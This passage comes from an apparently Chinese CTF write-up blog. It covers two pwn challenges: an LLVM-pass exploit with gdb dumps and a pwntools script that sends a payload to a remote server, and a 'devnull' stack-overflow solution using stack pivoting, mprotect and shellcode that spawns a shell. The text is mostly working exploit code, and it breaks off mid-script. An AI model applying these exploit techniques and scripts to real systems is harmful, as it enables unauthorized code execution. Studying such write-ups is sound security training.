class="hljs-number">1</span>);<br>n20(<span class="hljs-number">1</span>);<br>n21(<span class="hljs-number">1</span>);<br>n22(<span class="hljs-number">1</span>);<br>n23(<span class="hljs-number">1</span>);<br>n24(<span class="hljs-number">1</span>);<br>n25(<span class="hljs-number">1</span>);<br>n26(<span class="hljs-number">1</span>);<br>n27(<span class="hljs-number">1</span>);<br>n28(<span class="hljs-number">1</span>);<br>n29(<span class="hljs-number">1</span>);<br>n30(<span class="hljs-number">1</span>);<br>n31(<span class="hljs-number">1</span>);<br>n32(<span class="hljs-number">1</span>);<br>n33(<span class="hljs-number">1</span>);<br>n34(<span class="hljs-number">1</span>);<br>n35(<span class="hljs-number">1</span>);<br>n36(<span class="hljs-number">1</span>);<br>n37(<span class="hljs-number">1</span>);<br>n38(<span class="hljs-number">1</span>);<br>n39(<span class="hljs-number">1</span>);<br>n40(<span class="hljs-number">1</span>);<br>n41(<span class="hljs-number">1</span>);<br>n42(<span class="hljs-number">1</span>);<br>n43(<span class="hljs-number">1</span>);<br>n44(<span class="hljs-number">1</span>);<br>n45(<span class="hljs-number">1</span>);<br>n46(<span class="hljs-number">1</span>);<br>n47(<span class="hljs-number">1</span>);<br>n48(<span class="hljs-number">1</span>);<br>n49(<span class="hljs-number">1</span>);<br>n50(<span class="hljs-number">1</span>);<br>n51(<span class="hljs-number">1</span>);<br>n52(<span class="hljs-number">1</span>);<br>n53(<span class="hljs-number">1</span>);<br>n54(<span class="hljs-number">1</span>);<br>n55(<span class="hljs-number">1</span>);<br>n56(<span class="hljs-number">1</span>);<br>n57(<span class="hljs-number">1</span>);<br>n58(<span class="hljs-number">1</span>);<br>n59(<span class="hljs-number">1</span>);<br>n60(<span class="hljs-number">1</span>);<br>n61(<span class="hljs-number">1</span>);<br>n62(<span class="hljs-number">1</span>);<br>n63(<span class="hljs-number">1</span>);<br>n64(<span class="hljs-number">1</span>);<br>n65(<span class="hljs-number">1</span>);<br>n66(<span class="hljs-number">1</span>);<br>n67(<span class="hljs-number">1</span>);<br>n68(<span class="hljs-number">1</span>);<br>n69(<span class="hljs-number">1</span>);<br>n70(<span class="hljs-number">1</span>);<br>n71(<span class="hljs-number">1</span>);<br>n72(<span class="hljs-number">1</span>);<br>n73(<span class="hljs-number">1</span>);<br>n74(<span class="hljs-number">1</span>);<br>n75(<span class="hljs-number">1</span>);<br>n76(<span class="hljs-number">1</span>);<br>n77(<span class="hljs-number">1</span>);<br>n78(<span class="hljs-number">1</span>);<br>n79(<span class="hljs-number">1</span>);<br>n80(<span class="hljs-number">1</span>);<br>n81(<span class="hljs-number">1</span>);<br>n82(<span class="hljs-number">1</span>);<br>n83(<span class="hljs-number">1</span>);<br>n84(<span class="hljs-number">1</span>);<br>n85(<span class="hljs-number">1</span>);<br>n86(<span class="hljs-number">1</span>);<br>n87(<span class="hljs-number">1</span>);<br>n88(<span class="hljs-number">1</span>);<br>n89(<span class="hljs-number">1</span>);<br>n90(<span class="hljs-number">1</span>);<br>n91(<span class="hljs-number">1</span>);<br>n92(<span class="hljs-number">1</span>);<br>n93(<span class="hljs-number">1</span>);<br>n94(<span class="hljs-number">1</span>);<br>n95(<span class="hljs-number">1</span>);<br>n96(<span class="hljs-number">1</span>);<br>n97(<span class="hljs-number">1</span>);<br>n98(<span class="hljs-number">1</span>);<br>n99(<span class="hljs-number">1</span>);<br>n100(<span class="hljs-number">1</span>);<br>n101(<span class="hljs-number">1</span>);<br>n102(<span class="hljs-number">1</span>);<br>n103(<span class="hljs-number">1</span>);<br>n104(<span class="hljs-number">1</span>);<br>n105(<span class="hljs-number">1</span>);<br>n106(<span class="hljs-number">1</span>);<br>n107(<span class="hljs-number">1</span>);<br>n108(<span class="hljs-number">1</span>);<br>n109(<span class="hljs-number">1</span>);<br>n110(<span class="hljs-number">1</span>);<br>n111(<span class="hljs-number">1</span>);<br>n112(<span class="hljs-number">1</span>);<br>n113(<span class="hljs-number">1</span>);<br>n114(<span class="hljs-number">1</span>);<br>n115(<span class="hljs-number">1</span>);<br>n116(<span class="hljs-number">1</span>);<br>n117(<span class="hljs-number">1</span>);<br>n118(<span class="hljs-number">1</span>);<br>n119(<span class="hljs-number">1</span>);<br>n120(<span class="hljs-number">1</span>);<br>n121(<span class="hljs-number">1</span>);<br>n122(<span class="hljs-number">1</span>);<br>n123(<span class="hljs-number">1</span>);<br>n124(<span class="hljs-number">1</span>);<br>n125(<span class="hljs-number">1</span>);<br>n126(<span class="hljs-number">1</span>);<br>n127(<span class="hljs-number">1</span>);<br>n128(<span class="hljs-number">1</span>);<br>n129(<span class="hljs-number">1</span>);<br>n130(<span class="hljs-number">1</span>);<br>n131(<span class="hljs-number">1</span>);<br>n132(<span class="hljs-number">1</span>);<br>n133(<span class="hljs-number">1</span>);<br>n134(<span class="hljs-number">1</span>);<br>n135(<span class="hljs-number">1</span>);<br>n136(<span class="hljs-number">1</span>);<br>n137(<span class="hljs-number">1</span>);<br>n138(<span class="hljs-number">1</span>);<br>n139(<span class="hljs-number">1</span>);<br>n140(<span class="hljs-number">1</span>);<br>n141(<span class="hljs-number">1</span>);<br>n142(<span class="hljs-number">1</span>);<br>n143(<span class="hljs-number">1</span>);<br>n144(<span class="hljs-number">1</span>);<br>n145(<span class="hljs-number">1</span>);<br>n146(<span class="hljs-number">1</span>);<br>n147(<span class="hljs-number">1</span>);<br>n148(<span class="hljs-number">1</span>);<br>n149(<span class="hljs-number">1</span>);<br>n150(<span class="hljs-number">1</span>);<br>n151(<span class="hljs-number">1</span>);<br>n152(<span class="hljs-number">1</span>);<br>n153(<span class="hljs-number">1</span>);<br>n154(<span class="hljs-number">1</span>);<br>n155(<span class="hljs-number">1</span>);<br>n156(<span class="hljs-number">1</span>);<br>n157(<span class="hljs-number">1</span>);<br>n158(<span class="hljs-number">1</span>);<br>n159(<span class="hljs-number">1</span>);<br>n160(<span class="hljs-number">1</span>);<br>n161(<span class="hljs-number">1</span>);<br>n162(<span class="hljs-number">1</span>);<br>n163(<span class="hljs-number">1</span>);<br>n164(<span class="hljs-number">1</span>);<br>n165(<span class="hljs-number">1</span>);<br>n166(<span class="hljs-number">1</span>);<br>n167(<span class="hljs-number">1</span>);<br>n168(<span class="hljs-number">1</span>);<br>n169(<span class="hljs-number">1</span>);<br>n170(<span class="hljs-number">1</span>);<br>n171(<span class="hljs-number">1</span>);<br>n172(<span class="hljs-number">1</span>);<br>n173(<span class="hljs-number">1</span>);<br>n174(<span class="hljs-number">1</span>);<br>n175(<span class="hljs-number">1</span>);<br>n176(<span class="hljs-number">1</span>);<br>n177(<span class="hljs-number">1</span>);<br>n178(<span class="hljs-number">1</span>);<br>n179(<span class="hljs-number">1</span>);<br>n180(<span class="hljs-number">1</span>);<br>n181(<span class="hljs-number">1</span>);<br>n182(<span class="hljs-number">1</span>);<br>n183(<span class="hljs-number">1</span>);<br>n184(<span class="hljs-number">1</span>);<br>n185(<span class="hljs-number">1</span>);<br>n186(<span class="hljs-number">1</span>);<br>n187(<span class="hljs-number">1</span>);<br>n188(<span class="hljs-number">1</span>);<br>n189(<span class="hljs-number">1</span>);<br>n190(<span class="hljs-number">1</span>);<br>n191(<span class="hljs-number">1</span>);<br>n192(<span class="hljs-number">1</span>);<br>n193(<span class="hljs-number">1</span>);<br>n194(<span class="hljs-number">1</span>);<br>n195(<span class="hljs-number">1</span>);<br>n196(<span class="hljs-number">1</span>);<br>n197(<span class="hljs-number">1</span>);<br>n198(<span class="hljs-number">1</span>);<br>n199(<span class="hljs-number">1</span>);<br>n200(<span class="hljs-number">1</span>);<br>n201(<span class="hljs-number">1</span>);<br>n202(<span class="hljs-number">1</span>);<br>n203(<span class="hljs-number">1</span>);<br>n204(<span class="hljs-number">1</span>);<br>n205(<span class="hljs-number">1</span>);<br>n206(<span class="hljs-number">1</span>);<br>n207(<span class="hljs-number">1</span>);<br>n208(<span class="hljs-number">1</span>);<br>n209(<span class="hljs-number">1</span>);<br>n210(<span class="hljs-number">1</span>);<br>n211(<span class="hljs-number">1</span>);<br>n212(<span class="hljs-number">1</span>);<br>n213(<span class="hljs-number">1</span>);<br>n214(<span class="hljs-number">1</span>);<br>n215(<span class="hljs-number">1</span>);<br>n216(<span class="hljs-number">1</span>);<br>n217(<span class="hljs-number">1</span>);<br>n218(<span class="hljs-number">1</span>);<br>n219(<span class="hljs-number">1</span>);<br>n220(<span class="hljs-number">1</span>);<br>n221(<span class="hljs-number">1</span>);<br>n222(<span class="hljs-number">1</span>);<br>n223(<span class="hljs-number">1</span>);<br>n224(<span class="hljs-number">1</span>);<br>n225(<span class="hljs-number">1</span>);<br>n226(<span class="hljs-number">1</span>);<br>n227(<span class="hljs-number">1</span>);<br>n228(<span class="hljs-number">1</span>);<br>n229(<span class="hljs-number">1</span>);<br>n230(<span class="hljs-number">1</span>);<br>n231(<span class="hljs-number">1</span>);<br>n232(<span class="hljs-number">1</span>);<br>n233(<span class="hljs-number">1</span>);<br>n234(<span class="hljs-number">1</span>);<br>n235(<span class="hljs-number">1</span>);<br>n236(<span class="hljs-number">1</span>);<br>n237(<span class="hljs-number">1</span>);<br>n238(<span class="hljs-number">1</span>);<br>n239(<span class="hljs-number">1</span>);<br>n240(<span class="hljs-number">1</span>);<br>n241(<span class="hljs-number">1</span>);<br>n242(<span class="hljs-number">1</span>);<br>n243(<span class="hljs-number">1</span>);<br>n244(<span class="hljs-number">1</span>);<br>n245(<span class="hljs-number">1</span>);<br>n246(<span class="hljs-number">1</span>);<br>n247(<span class="hljs-number">1</span>);<br>n248(<span class="hljs-number">1</span>);<br>n249(<span class="hljs-number">1</span>);<br>n250(<span class="hljs-number">1</span>);<br>n251(<span class="hljs-number">1</span>);<br>n252(<span class="hljs-number">1</span>);<br>n253(<span class="hljs-number">1</span>);<br>n254(<span class="hljs-number">1</span>);<br>n255(<span class="hljs-number">1</span>);<br>n256(<span class="hljs-number">1</span>);<br>n257(<span class="hljs-number">1</span>);<br>n258(<span class="hljs-number">1</span>);<br>n259(<span class="hljs-number">1</span>);<br>n260(<span class="hljs-number">1</span>);<br>n261(<span class="hljs-number">1</span>);<br>n262(<span class="hljs-number">1</span>);<br>n263(<span class="hljs-number">1</span>);<br>n264(<span class="hljs-number">1</span>);<br>n265(<span class="hljs-number">1</span>);<br>n266(<span class="hljs-number">1</span>);<br>n267(<span class="hljs-number">1</span>);<br>n268(<span class="hljs-number">1</span>);<br>n269(<span class="hljs-number">1</span>);<br>n270(<span class="hljs-number">1</span>);<br>n271(<span class="hljs-number">1</span>);<br>n272(<span class="hljs-number">1</span>);<br>n273(<span class="hljs-number">1</span>);<br>n274(<span class="hljs-number">1</span>);<br>n275(<span class="hljs-number">1</span>);<br>n276(<span class="hljs-number">1</span>);<br>n277(<span class="hljs-number">1</span>);<br>n278(<span class="hljs-number">1</span>);<br>n279(<span class="hljs-number">1</span>);<br>n280(<span class="hljs-number">1</span>);<br>n281(<span class="hljs-number">1</span>);<br>n282(<span class="hljs-number">1</span>);<br>n283(<span class="hljs-number">1</span>);<br>n284(<span class="hljs-number">1</span>);<br>n285(<span class="hljs-number">1</span>);<br>n286(<span class="hljs-number">1</span>);<br>n287(<span class="hljs-number">1</span>);<br>n288(<span class="hljs-number">1</span>);<br>n289(<span class="hljs-number">1</span>);<br>n290(<span class="hljs-number">1</span>);<br>n291(<span class="hljs-number">1</span>);<br>n292(<span class="hljs-number">1</span>);<br>n293(<span class="hljs-number">1</span>);<br>n294(<span class="hljs-number">1</span>);<br>n295(<span class="hljs-number">1</span>);<br>n296(<span class="hljs-number">1</span>);<br>n297(<span class="hljs-number">1</span>);<br>n298(<span class="hljs-number">1</span>);<br>n299(<span class="hljs-number">1</span>);<br>n300(<span class="hljs-number">1</span>);<br>n301(<span class="hljs-number">1</span>);<br>n302(<span class="hljs-number">1</span>);<br>n303(<span class="hljs-number">1</span>);<br>n304(<span class="hljs-number">1</span>);<br>n305(<span class="hljs-number">1</span>);<br>n306(<span class="hljs-number">1</span>);<br>n307(<span class="hljs-number">0x29</span>);<br>n308(<span class="hljs-number">0x22</span>);<br>n309(<span class="hljs-number">0x41</span>);<br>n310(<span class="hljs-number">0</span>);<br><br><span class="hljs-comment">// opt-8           0x412229 jae    0x412293 /* &#x27;sh&#x27; */</span><br><span class="hljs-comment">// opt-8           0x42c7df jae    0x42c849 /* &#x27;shift_div&#x27; */</span><br><span class="hljs-comment">// opt-8           0x42cbd7 jae    0x42cc41 /* &#x27;sh_nonemptyEv&#x27; */</span><br><span class="hljs-comment">// opt-8           0x432faa jae    0x433014 /* &#x27;shifted_simple_hull_from_set_list&#x27; */</span><br><span class="hljs-comment">// opt-8           0x4330aa jae    0x433114 /* &#x27;shifted_simple_hull_from_map_list&#x27; */</span><br><span class="hljs-comment">// opt-8           0x434c56 jae    0x434cc0 /* &#x27;sh_table_init&#x27; */</span><br><span class="hljs-comment">// opt-8           0x434dc9 jae    0x434e33 /* &#x27;shift&#x27; */</span><br><span class="hljs-comment">// opt-8           0x434de6 jae    0x434e50 /* &#x27;shift&#x27; */</span><br><span class="hljs-comment">// opt-8           0x434e03 jae    0x434e6d /* &#x27;shift&#x27; */</span><br><span class="hljs-comment">// opt-8           0x437414 jae    0x43747e /* &#x27;sh_bits&#x27; */</span><br><span class="hljs-comment">// opt-8           0x4375a5 jae    0x43760f /* &#x27;shift_point_loops&#x27; */</span><br><span class="hljs-comment">// opt-8           0x4375cc jae    0x437636 /* &#x27;shift_point_loops&#x27; */</span><br><span class="hljs-comment">// opt-8           0x43791b jae    0x437985 /* &#x27;sh_tokens&#x27; */</span><br><span class="hljs-comment">// opt-8           0x43963f jae    0x4396a9 /* &#x27;sh_basis&#x27; */</span><br><span class="hljs-comment">// opt-8           0x43bab0 jae    0x43bb1a /* &#x27;shared_ancestor&#x27; */</span><br><span class="hljs-comment">// opt-8           0x43c7be jae    0x43c828 /* &#x27;shift_var&#x27; */</span><br><span class="hljs-comment">// opt-8           0x43c81e jae    0x43c888 /* &#x27;sh_var&#x27; */</span><br><span class="hljs-comment">// opt-8           0x43c88b jae    0x43c8f5 /* &#x27;sh_table_clear&#x27; */</span><br><span class="hljs-comment">// opt-8           0x4413d4 jae    0x44143e /* &#x27;sh_token&#x27; */</span><br><span class="hljs-comment">// opt-8           0x441c6e jae    0x441cd8 /* &#x27;sh_mem&#x27; */</span><br><span class="hljs-comment">// opt-8           0x4429c0 jae    0x442a2a /* &#x27;shared_ptrIN5polly12RejectReasonEELb0EE4growEm&#x27; */</span><br><span class="hljs-comment">// opt-8           0x443216 jae    0x443280 /* &#x27;sholdEm&#x27; */</span><br><span class="hljs-comment">// opt-8           0x4435b1 jae    0x44361b /* &#x27;shifted_simple_hull&#x27; */</span><br><span class="hljs-comment">// opt-8           0x4435cf jae    0x443639 /* &#x27;shifted_simple_hull&#x27; */</span><br><span class="hljs-comment">// opt-8           0x4435f3 jae    0x44365d /* &#x27;shifted_simple_hull&#x27; */</span><br><span class="hljs-comment">// opt-8           0x443617 jae    0x443681 /* &#x27;shifted_simple_hull&#x27; */</span><br><span class="hljs-comment">// opt-8           0x443641 jae    0x4436ab /* &#x27;shifted_simple_hull&#x27; */</span><br><span class="hljs-comment">// opt-8           0x4452b5 jae    0x44531f /* &#x27;sh_callback&#x27; */</span><br><span class="hljs-comment">// opt-8           0x445c12 jae    0x445c7c /* &#x27;shTableEj&#x27; */</span><br><span class="hljs-comment">// opt-8           0x44636c jae    0x4463d6 /* &#x27;shiftDimEN3isl12noexceptions9union_setEii&#x27; */</span><br><span class="hljs-comment">// opt-8           0x4463a0 jae    0x44640a /* &#x27;shiftDimEN3isl12noexceptions3setEii&#x27; */</span><br><span class="hljs-comment">// opt-8           0x4463ce jae    0x446438 /* &#x27;shiftDimEN3isl12noexceptions9union_mapENS1_3dimEii&#x27; */</span><br><span class="hljs-comment">// opt-8           0x44640b jae    0x446475 /* &#x27;shiftDimEN3isl12noexceptions3mapENS1_3dimEii&#x27; */</span><br><span class="hljs-comment">// opt-8           0x44696b jae    0x4469d5 /* &#x27;sh&#x27; */</span><br><span class="hljs-comment">// opt-8           0x446972 jae    0x4469dc /* &#x27;sh&#x27; */</span><br><span class="hljs-comment">// opt-8           0x446984 jae    0x4469ee /* &#x27;sh&#x27; */</span><br><span class="hljs-comment">// opt-8           0x44699b jae    0x446a05 /* &#x27;sh&#x27; */</span><br><span class="hljs-comment">// opt-8           0x4469ac jae    0x446a16 /* &#x27;sh&#x27; */</span><br><br><br>n311(<span class="hljs-number">1</span>);<br>n312(<span class="hljs-number">1</span>);<br>n313(<span class="hljs-number">1</span>);<br>n314(<span class="hljs-number">0xda</span>);<br>n315(<span class="hljs-number">0xdf</span>);<br>n316(<span class="hljs-number">0x77</span>);<br>n317(<span class="hljs-number">0</span>);<br>n318(<span class="hljs-number">1</span>);<br><br><br><span class="hljs-comment">// n327(1); // -2</span><br><span class="hljs-comment">// n328(1); // -1</span><br><span class="hljs-comment">// n307(1); // cmd</span><br>n316(<span class="hljs-number">1</span>); <span class="hljs-comment">// stdout@got + 2 0x77dfda</span><br>n315(<span class="hljs-number">1</span>); <br>n314(<span class="hljs-number">1</span>); <br>n307(<span class="hljs-number">1</span>); <br>n308(<span class="hljs-number">1</span>); <br>n309(<span class="hljs-number">1</span>); <br>n310(<span class="hljs-number">1</span>); <br><br>fight(<span class="hljs-number">0</span>);<br><span class="hljs-comment">// n264(1); // -1</span><br><span class="hljs-comment">// n328(1); // -1</span><br><span class="hljs-comment">// fight(-2);</span><br><span class="hljs-comment">// fight(-3);</span><br><span class="hljs-comment">// fight(-4);</span><br><span class="hljs-comment">// fight(-5);</span><br><span class="hljs-comment">// fight(-6);</span><br><br><span class="hljs-comment">// merge(-1,0);</span><br><span class="hljs-comment">// merge(-1,-2);</span><br><span class="hljs-comment">// merge(-1,-3);</span><br><span class="hljs-comment">// merge(2,3);</span><br>&#125;<br><span class="hljs-comment">// 0x412229</span><br><span class="hljs-comment">// 0x7ffff4e20750 0x7ffff3b63880 0x7ffff3b641d7</span><br><span class="hljs-comment">// 0x7ffff3b57000 0x6668936d277b6892 0x7ffff3b639e6 0x7ffff3b63af6 0x7ffff3b64278 0x7ffff3b641c5</span><br><span class="hljs-comment">/* 0xD2780x7ffff3b641c5</span><br><span class="hljs-comment"> â–º 0x7ffff4e2077e &lt;llvm::FPPassManager::runOnModule(llvm::Module&amp;)+46&gt;    call   llvm::FPPassManager::runOnFunction(llvm::Function&amp;)                &lt;llvm::FPPassManager::runOnFunction(llvm::Function&amp;)&gt;</span><br><span class="hljs-comment"> 0x4bb7e3 &lt;main+11507&gt;    call   llvm::legacy::PassManager::run(llvm::Module&amp;)@plt  </span><br><span class="hljs-comment"> â–º 0x7ffff4e20b48 &lt;llvm::legacy::PassManagerImpl::run(llvm::Module&amp;)+744&gt;    call   qword ptr [rax + 0x88]        &lt;llvm::FPPassManager::runOnModule(llvm::Module&amp;)&gt;</span><br><span class="hljs-comment">x/50xg 0x7ffff3d6d978</span><br><span class="hljs-comment">0x7ffff3d6d9a8 &lt;cmd&gt;:0x0000000000824d000x0000000000822fb0</span><br><span class="hljs-comment">0x7ffff3d6d9b8:0x00000000000000000x6868686868d06868</span><br><span class="hljs-comment">0x7ffff3d6d9c8 &lt;weaponlist+8&gt;:0x68686868686868680x6868686868686868</span><br><span class="hljs-comment">0x7ffff3d6d9d8 &lt;weaponlist+24&gt;:0x68686868686868680x6868686868686868</span><br><span class="hljs-comment">0x7ffff3d6d9e8 &lt;weaponlist+40&gt;:0x68686868686868680x6868686868686868</span><br><span class="hljs-comment">0x7ffff3d6d9f8 &lt;weaponlist+56&gt;:0x68686868686868680x6868686868686868</span><br><span class="hljs-comment">0x7ffff3d6da08 &lt;weaponlist+72&gt;:0x68686868686868680x6868686868686868</span><br><span class="hljs-comment">0x7ffff3d6da18 &lt;weaponlist+88&gt;:0x68686868686868680x6868686868686868</span><br><span class="hljs-comment">0x7ffff3d6da28 &lt;weaponlist+104&gt;:0x68686868686868680x6868686868686868</span><br><span class="hljs-comment">0x7ffff3d6da38 &lt;weaponlist+120&gt;:0x68686868686868680x6868686868686868</span><br><span class="hljs-comment">0x7ffff3d6da48 &lt;weaponlist+136&gt;:0x68686868686868680x6868686868686868</span><br><span class="hljs-comment">0x7ffff3d6da58 &lt;weaponlist+152&gt;:0x68686868686868680x6868686868686868</span><br><span class="hljs-comment">0x7ffff3d6da68 &lt;weaponlist+168&gt;:0x68686868686868680x6868686868686868</span><br><span class="hljs-comment">0x7ffff3d6da78 &lt;weaponlist+184&gt;:0x68686868686868680x6868686868686868</span><br><span class="hljs-comment">0x7ffff3d6da88 &lt;weaponlist+200&gt;:0x68686868686868680x6868686868686868</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> </span><br><span class="hljs-comment">wea 2169C0  2169A8</span><br><span class="hljs-comment"> </span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h4 id="exp-py"><a class="header-anchor" href="#exp-py">Â¶</a><a href="http://exp.py">exp.py</a></h4><p>ç”¨æ¥æ”»å‡»è¿œç¨‹çš„è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># python exp.py 123.56.105.22 35252</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br><br>p = remote(sys.argv[<span class="hljs-number">1</span>], sys.argv[<span class="hljs-number">2</span>])<br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./exp.ll&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>)<br><br>payload=f.read()<br><br>f.close()<br><br>payload2 = payload.encode(<span class="hljs-string">&quot;base64&quot;</span>).replace(<span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;give&quot;</span>, payload2)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="devnull"><a class="header-anchor" href="#devnull">Â¶</a>devnull</h3><h4 id="åˆ†æ-v3"><a class="header-anchor" href="#åˆ†æ-v3">Â¶</a>åˆ†æ</h4><p>å­˜åœ¨æ ˆæº¢å‡ºï¼Œå¯ä»¥è¦†ç›–æ‰ fd çš„åŒæ—¶è¦†ç›–æ‰ rbp å’Œ ripï¼Œè€ƒè™‘æ ˆè¿ç§»ã€‚</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220731133726905.png" alt="devnull1"></p><p>çœ‹åˆ°æ§åˆ¶æ‰§è¡Œæµæ—¶ rdx ä¸º 7ã€‚</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220731133853102.png" alt="devnull2"></p><p>æ¯”è¾ƒçªå…€çš„ strlen ä¸­ï¼Œæœ‰æ§åˆ¶ rax çš„ gadgetã€‚</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220731133935959.png" alt="devnull3"></p><p>é…åˆ mprotect å¯ä»¥æ‰¬æˆ rwx æƒé™ã€‚</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220731134022615.png" alt="devnull4"></p><p>è¯»å…¥ç¬¬ä¸€æ®µ shellcode æ‰©å¤§è¾“å…¥å­—èŠ‚æ•°ï¼Œç„¶åç›´æ¥è°ƒ <a href="http://shellcraft.sh">shellcraft.sh</a>() å³å¯ï¼Œæ³¨æ„çš„æ˜¯è¾“å‡ºæµè¢«å…³é—­äº†ï¼Œæ‰§è¡Œ <code>exec 1&gt;&amp;0</code> æ¢å¤å°±è¡Œã€‚</p><h4 id="Exp-v2"><a class="header-anchor" href="#Exp-v2">Â¶</a>Exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    glibc_dir = <span class="hljs-string">&#x27;~/pwn/source/glibc-2.35/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %self/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdbscript += <span class="hljs-string">&#x27;b fprintf&#x27;</span><br>    gdb.attach(p, gdbscript)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./devnull&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-hp&#x27;</span>,<span class="hljs-string">&#x27;62&#x27;</span>])<br><span class="hljs-comment"># p = process(&#x27;./devnull&#x27;)</span><br><span class="hljs-comment"># debug(0x4014E3)</span><br>p = remote(<span class="hljs-string">&#x27;47.94.166.51&#x27;</span>,<span class="hljs-number">33797</span>)<br>addr = <span class="hljs-number">0x3fe000</span> + <span class="hljs-number">0x500</span><br>leave_ret = <span class="hljs-number">0x401511</span><br>rax_leave_ret = <span 